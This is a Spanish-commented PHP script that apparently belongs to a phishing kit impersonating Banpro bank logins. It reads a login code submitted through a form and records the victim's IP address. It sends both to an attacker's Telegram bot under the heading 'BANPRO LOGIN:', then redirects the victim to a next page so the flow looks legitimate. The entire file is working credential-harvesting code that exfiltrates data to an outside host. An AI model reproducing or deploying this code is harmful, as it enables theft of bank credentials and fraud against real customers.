<?php
// Incluir el archivo de configuración
$config = include('config.php');

// Verificar si los datos de configuración existen
if (!isset($config['token']) || !isset($config['chat_id'])) {
    echo "Error: Configuración de Telegram no encontrada.";
    exit;
}

// Obtener los valores de configuración
$token = $config['token'];
$chat_id = $config['chat_id'];

// Obtener el código enviado desde el formulario
$codigo = isset($_POST['ips1']) ? htmlspecialchars($_POST['ips1']) : '';

// Validar que el código no esté vacío
if (empty($codigo)) {
    echo "Error: El campo código es obligatorio.";
    exit;
}

// Función para obtener la IP del cliente
function obtenerIPCliente() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]); // La primera IP de la lista es la real
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Obtener la IP del cliente
$ip = obtenerIPCliente();

// Crear el mensaje
$mensaje = "BANPRO LOGIN:";
$mensaje .= "\n🔑 Código 1: $codigo";
$mensaje .= "\n🌍 IP: $ip";

// Enviar el mensaje a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown' // Formato de texto para Telegram
];

// Usar cURL para realizar la solicitud
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
if ($response === false) {
    echo "Error al enviar el mensaje: " . curl_error($ch);
    exit;
}

// Cerrar cURL
curl_close($ch);

// Redirigir después de enviar el mensaje
header("Location: 3.html");
exit;
?>
